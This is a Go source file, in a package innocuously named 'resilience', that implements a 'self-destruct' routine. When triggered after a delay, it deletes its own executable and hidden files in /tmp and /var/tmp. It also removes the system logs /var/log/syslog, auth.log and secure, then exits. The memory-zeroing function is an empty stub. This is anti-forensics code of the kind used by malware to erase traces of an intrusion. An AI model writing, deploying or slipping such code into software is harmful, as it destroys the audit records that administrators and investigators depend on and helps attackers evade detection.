package resilience

import (
	"log"
	"os"
	"sync"
	"syscall"
	"time"
)

type SelfDestruct struct {
	mu          sync.RWMutex
	triggered   bool
	delay       time.Duration
	cleanupFunc func()
}

func NewSelfDestruct(delay time.Duration, cleanupFunc func()) *SelfDestruct {
	return &SelfDestruct{
		delay:       delay,
		cleanupFunc: cleanupFunc,
	}
}

func (s *SelfDestruct) Trigger() {
	s.mu.Lock()
	if s.triggered {
		s.mu.Unlock()
		return
	}
	s.triggered = true
	s.mu.Unlock()

	log.Println("Self-destruct triggered")

	go func() {
		time.Sleep(s.delay)
		s.execute()
	}()
}

func (s *SelfDestruct) execute() {
	if s.cleanupFunc != nil {
		s.cleanupFunc()
	}

	s.deleteFiles()
	s.clearLogs()
	s.zeroMemory()

	log.Println("Self-destruct complete")
	os.Remove(os.Args[0])
	syscall.Exit(0)
}

func (s *SelfDestruct) deleteFiles() {
	files := []string{
		os.Args[0],
		"/tmp/.hidden",
		"/var/tmp/.cache",
	}

	for _, file := range files {
		os.Remove(file)
	}
}

func (s *SelfDestruct) clearLogs() {
	logFiles := []string{
		"/var/log/syslog",
		"/var/log/auth.log",
		"/var/log/secure",
	}

	for _, logFile := range logFiles {
		os.Remove(logFile)
	}
}

func (s *SelfDestruct) zeroMemory() {
}

func (s *SelfDestruct) IsTriggered() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.triggered
}

func (s *SelfDestruct) Cancel() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.triggered = false
}

func (s *SelfDestruct) SetDelay(delay time.Duration) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.delay = delay
}

func (s *SelfDestruct) GetDelay() time.Duration {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.delay
}
